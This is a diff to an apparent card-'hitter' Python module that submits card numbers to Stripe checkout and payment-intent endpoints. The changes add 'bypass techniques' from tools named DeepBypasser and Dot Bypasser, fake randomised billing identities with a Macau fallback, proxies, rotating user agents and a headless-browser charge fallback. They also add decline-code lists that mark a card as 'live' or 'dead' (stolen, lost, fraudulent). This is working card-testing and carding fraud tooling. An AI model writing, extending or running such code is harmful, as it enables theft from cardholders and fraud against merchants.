@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
-"""Stripe charge with session-based approach.
-1. Fetch checkout page → get cookies + session context
-2. Send raw card data directly in confirm call (skip token/PM creation)
-3. Fallback to token-based and PM-based methods
+"""Stripe charge with session-based approach + bypass techniques from
+DeepBypasser and Dot Bypasser.
+Methods: direct pages, direct PI, token, PM, setup_intent
+Fallbacks: JS origin headers, Macau billing, browser-based charge
 """
 import time
 import asyncio
@@ -13,11 +13,27 @@ from billing_data import (
     random_full_name, random_email, random_address,
     random_user_agent, random_timezone, random_locale,
     build_stripe_headers, build_stripe_headers_js,
+    random_billing_for_country,
 )
+
+from hitter.browser_charge import browser_charge_card, close_browser
 
 _session = None
 _site_method_cache: dict[str, str] = {}
 _checkout_cookies_cache: dict[str, dict] = {}
+
+LIVE_DECLINE_CODES = frozenset({
+    "incorrect_cvc", "incorrect_zip", "insufficient_funds",
+    "authentication_required", "card_velocity_exceeded",
+})
+
+DEAD_DECLINE_CODES = frozenset({
+    "stolen_card", "lost_card", "fraudulent", "pickup_card",
+    "restricted_card", "security_violation", "card_not_supported",
+    "invalid_account", "new_account_information_available",
+    "do_not_honor", "do_not_try_again", "invalid_amount",
+    "currency_not_supported", "testmode_decline",
+})
 
 
 async def get_session():
@@ -41,7 +57,12 @@ def _is_surface_error(data: dict) -> bool:
     if "error" not in data:
         return False
     msg = (data["error"].get("message") or "").lower()
-    return "integration surface" in msg or "unsupported for publishable key" in msg
+    code = (data["error"].get("code") or "").lower()
+    return (
+        "integration surface" in msg
+        or "unsupported for publishable key" in msg
+        or code == "resource_missing"
+    )
 
 
 def _extract_pi_info(init_data: dict) -> tuple[str, str]:
@@ -49,6 +70,14 @@ def _extract_pi_info(init_data: dict) -> tuple[str, str]:
     client_secret = pi.get("client_secret", "")
     pi_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
     return pi_id, client_secret
+
+
+def _extract_si_info(init_data: dict) -> tuple[str, str]:
+    """Extract setup_intent info if present."""
+    si = init_data.get("setup_intent") or {}
+    client_secret = si.get("client_secret", "")
+    si_id = client_secret.split("_secret_")[0] if "_secret_" in client_secret else ""
+    return si_id, client_secret
 
 
 def _get_amounts(init_data: dict) -> tuple[int, int]:
@@ -63,10 +92,10 @@ def _get_amounts(init_data: dict) -> tuple[int, int]:
     return amt, amt
 
 
-def _get_billing(init_data: dict) -> dict:
+def _get_billing(init_data: dict, country: str = "US") -> dict:
     cust = init_data.get("customer") or {}
     addr = cust.get("address") or {}
-    billing = random_address()
+    billing = random_billing_for_country(country)
     return {
         "name": cust.get("name") or billing["name"],
         "email": init_data.get("customer_email") or random_email(),
@@ -79,21 +108,60 @@ def _get_billing(init_data: dict) -> dict:
 
 
 def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
+    """Parse confirm response with comprehensive decline code handling
+    from DeepBypasser."""
     if _is_surface_error(conf):
         return None
+
     if "error" in conf:
         err = conf["error"]
         dc = err.get("decline_code", "")
+        code = err.get("code", "")
         msg = err.get("message", "Failed")
-        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
-    pi = conf.get("payment_intent") or {}
+        if dc in LIVE_DECLINE_CODES:
+            return "CCN", f"{dc.upper()}: {msg}"
+        return "DECLINED", f"{dc.upper()}: {msg}" if dc else (f"{code}: {msg}" if code else msg)
+
+    pi = conf.get("payment_intent") or conf.get("setup_intent") or {}
     st = pi.get("status", "") or conf.get("status", "")
+
     if st == "succeeded":
         return "CHARGED", "Charged"
     if st == "requires_action":
         return "3DS", "3DS Required"
     if st == "requires_payment_method":
-        return "DECLINED", "Declined"
+        lpe = pi.get("last_payment_error") or pi.get("last_setup_error") or {}
+        dc = lpe.get("decline_code", "")
+        msg = lpe.get("message", "Declined")
+        if dc in LIVE_DECLINE_CODES:
+            return "CCN", f"{dc.upper()}: {msg}"
+        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
+
+    charge = conf.get("charge") or {}
+    charges = conf.get("charges", {})
+    outcome = None
+    if isinstance(charge, dict) and "outcome" in charge:
+        outcome = charge["outcome"]
+    if isinstance(charges, dict):
+        ch_data = charges.get("data", [])
+        if isinstance(ch_data, list) and ch_data:
+            c0 = ch_data[0]
+            if isinstance(c0, dict) and "outcome" in c0:
+                outcome = c0["outcome"]
+
+    if outcome and isinstance(outcome, dict):
+        net_dc = outcome.get("network_decline_code", "")
+        net_adv = outcome.get("network_advice_code", "")
+        reason = outcome.get("reason", "")
+        seller_msg = outcome.get("seller_message", "")
+
+        if reason in LIVE_DECLINE_CODES:
+            return "CCN", f"{reason}: {seller_msg or net_dc}"
+        if seller_msg:
+            return "DECLINED", seller_msg
+        if reason:
+            return "DECLINED", f"{reason}: {net_dc}" if net_dc else reason
+
     return "UNKNOWN", st or "Unknown"
 
 
@@ -120,7 +188,6 @@ def _card_pm_data(card: dict) -> str:
 
 
 async def _fetch_checkout_cookies(checkout_url: str, proxy_url: str | None = None) -> dict:
-    """Visit checkout page to establish session cookies."""
     cs_match = re.search(r"cs_(live|test)_[A-Za-z0-9]+", checkout_url)
     cache_key = cs_match.group(0) if cs_match else checkout_url
     if cache_key in _checkout_cookies_cache:
@@ -155,9 +222,8 @@ async def _fetch_checkout_cookies(checkout_url: str, proxy_url: str | None = Non
     return cookies
 
 
-async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url):
-    """Send raw card data directly in payment_pages/confirm (no token/PM step)."""
-    b = _get_billing(init_data)
+async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url, country="US"):
+    b = _get_billing(init_data, country)
     total, subtotal = _get_amounts(init_data)
     checksum = init_data.get("init_checksum", "")
 
@@ -181,13 +247,12 @@ async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url):
     return _parse_confirm_response(conf)
 
 
-async def _method_direct_pi(s, card, pk, init_data, headers, proxy_url):
-    """Send raw card data directly in PaymentIntent/confirm."""
+async def _method_direct_pi(s, card, pk, init_data, headers, proxy_url, country="US"):
     pi_id, client_secret = _extract_pi_info(init_data)
     if not pi_id or not client_secret:
         return None
 
-    b = _get_billing(init_data)
+    b = _get_billing(init_data, country)
     body = (
         f"{_card_pm_data(card)}"
         f"{_billing_params('payment_method_data[billing_details]', b)}"
@@ -204,8 +269,7 @@ async def _method_direct_pi(s, card, pk, init_data, headers, proxy_url):
     return _parse_confirm_response(conf)
 
 
-async def _method_token_pi(s, card, pk, init_data, headers, proxy_url):
-    """Create token then confirm PaymentIntent."""
+async def _method_token_pi(s, card, pk, init_data, headers, proxy_url, country="US"):
     token_body = (
         f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
         f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
@@ -220,7 +284,12 @@ async def _method_token_pi(s, card, pk, init_data, headers, proxy_url):
     if _is_surface_error(tok):
         return None
     if "error" in tok:
-        return "DECLINED", tok["error"].get("message", "Token error")[:60]
+        dc = tok["error"].get("decline_code", "")
+        code = tok["error"].get("code", "")
+        msg = tok["error"].get("message", "Token error")[:80]
+        if dc in LIVE_DECLINE_CODES:
+            return "CCN", f"{dc.upper()}: {msg}"
+        return "DECLINED", f"{dc.upper()}: {msg}" if dc else (f"{code}: {msg}" if code else msg)
     tok_id = tok.get("id")
     if not tok_id:
         return "FAILED", "No token"
@@ -229,7 +298,7 @@ async def _method_token_pi(s, card, pk, init_data, headers, proxy_url):
     if not pi_id or not client_secret:
         return None
 
-    b = _get_billing(init_data)
+    b = _get_billing(init_data, country)
     confirm_body = (
         f"payment_method_data[type]=card"
         f"&payment_method_data[card][token]={tok_id}"
@@ -247,9 +316,8 @@ async def _method_token_pi(s, card, pk, init_data, headers, proxy_url):
     return _parse_confirm_response(conf)
 
 
-async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url):
-    """Create PaymentMethod then confirm via payment_pages."""
-    b = _get_billing(init_data)
+async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url, country="US"):
+    b = _get_billing(init_data, country)
     pm_body = (
         f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
         f"&card[exp_month]={card['mm']}&card[exp_year]={card['yy']}"
@@ -264,7 +332,11 @@ async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url):
     if _is_surface_error(pm):
         return None
     if "error" in pm:
-        return "DECLINED", pm["error"].get("message", "Card error")[:60]
+        dc = pm["error"].get("decline_code", "")
+        msg = pm["error"].get("message", "Card error")[:80]
+        if dc in LIVE_DECLINE_CODES:
+            return "CCN", f"{dc.upper()}: {msg}"
+        return "DECLINED", f"{dc.upper()}: {msg}" if dc else msg
     pm_id = pm.get("id")
     if not pm_id:
         return "FAILED", "No PM"
@@ -289,6 +361,29 @@ async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url):
     return _parse_confirm_response(conf)
 
 
+async def _method_setup_intent(s, card, pk, init_data, headers, proxy_url, country="US"):
+    """Try confirming via SetupIntent if present."""
+    si_id, client_secret = _extract_si_info(init_data)
+    if not si_id or not client_secret:
+        return None
+
+    b = _get_billing(init_data, country)
+    body = (
+        f"{_card_pm_data(card)}"
+        f"{_billing_params('payment_method_data[billing_details]', b)}"
+        f"&expected_payment_method_type=card"
+        f"&return_url=https%3A%2F%2Fcheckout.stripe.com%2F"
+        f"&key={pk}&client_secret={client_secret}"
+    )
+    async with s.post(
+        f"https://api.stripe.com/v1/setup_intents/{si_id}/confirm",
+        headers=headers, data=body, proxy=proxy_url,
+    ) as r:
+        conf = await r.json()
+
+    return _parse_confirm_response(conf)
+
+
 async def charge_card_fast(
     card: dict, pk: str, cs: str, init_data: dict,
     checkout_url: str = "",
@@ -301,6 +396,9 @@ async def charge_card_fast(
 
     cached = _site_method_cache.get(cs)
 
+    if cached == "BROWSER" and checkout_url:
+        return await browser_charge_card(card, checkout_url, proxy_url)
+
     if checkout_url:
         await _fetch_checkout_cookies(checkout_url, proxy_url)
 
@@ -309,8 +407,6 @@ async def charge_card_fast(
             ua = random_user_agent()
             h_checkout = build_stripe_headers(ua, origin="https://checkout.stripe.com")
             h_js = build_stripe_headers_js(ua)
-            locale = random_locale()
-            tz = random_timezone()
 
             cookies = _checkout_cookies_cache.get(cs, {})
             if cookies:
@@ -323,17 +419,21 @@ async def charge_card_fast(
                 connector=connector,
                 timeout=aiohttp.ClientTimeout(total=25, connect=8),
             ) as s:
+                billing_countries = ["US", "MO"]
+
                 all_methods = [
-                    ("DP", lambda: _method_direct_pages(s, card, pk, cs, init_data, h_checkout, proxy_url)),
-                    ("DI", lambda: _method_direct_pi(s, card, pk, init_data, h_checkout, proxy_url)),
-                    ("DP_JS", lambda: _method_direct_pages(s, card, pk, cs, init_data, h_js, proxy_url)),
-                    ("DI_JS", lambda: _method_direct_pi(s, card, pk, init_data, h_js, proxy_url)),
-                    ("TK", lambda: _method_token_pi(s, card, pk, init_data, h_checkout, proxy_url)),
-                    ("TK_JS", lambda: _method_token_pi(s, card, pk, init_data, h_js, proxy_url)),
-                    ("PM", lambda: _method_pm_pages(s, card, pk, cs, init_data, h_checkout, proxy_url)),
+                    ("DP", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
+                    ("DI", lambda c="US": _method_direct_pi(s, card, pk, init_data, h_checkout, proxy_url, c)),
+                    ("DP_JS", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_js, proxy_url, c)),
+                    ("DI_JS", lambda c="US": _method_direct_pi(s, card, pk, init_data, h_js, proxy_url, c)),
+                    ("TK", lambda c="US": _method_token_pi(s, card, pk, init_data, h_checkout, proxy_url, c)),
+                    ("TK_JS", lambda c="US": _method_token_pi(s, card, pk, init_data, h_js, proxy_url, c)),
+                    ("PM", lambda c="US": _method_pm_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
+                    ("SI", lambda c="US": _method_setup_intent(s, card, pk, init_data, h_checkout, proxy_url, c)),
+                    ("SI_JS", lambda c="US": _method_setup_intent(s, card, pk, init_data, h_js, proxy_url, c)),
                 ]
 
-                if cached:
+                if cached and cached != "BROWSER":
                     ordered = [m for m in all_methods if m[0] == cached]
                     ordered += [m for m in all_methods if m[0] != cached]
                 else:
@@ -341,13 +441,23 @@ async def charge_card_fast(
 
                 res = None
                 for method_name, method_fn in ordered:
-                    try:
-                        res = await method_fn()
-                    except Exception:
-                        res = None
+                    for country in billing_countries:
+                        try:
+                            res = await method_fn(country)
+                        except Exception:
+                            res = None
+                        if res is not None:
+                            _site_method_cache[cs] = method_name
+                            break
                     if res is not None:
-                        _site_method_cache[cs] = method_name
                         break
+
+                if res is None and checkout_url:
+                    br = await browser_charge_card(card, checkout_url, proxy_url)
+                    result.update(br)
+                    if br["status"] not in (None, "ERROR"):
+                        _site_method_cache[cs] = "BROWSER"
+                    return result
 
                 if res is None:
                     result["status"] = "FAILED"
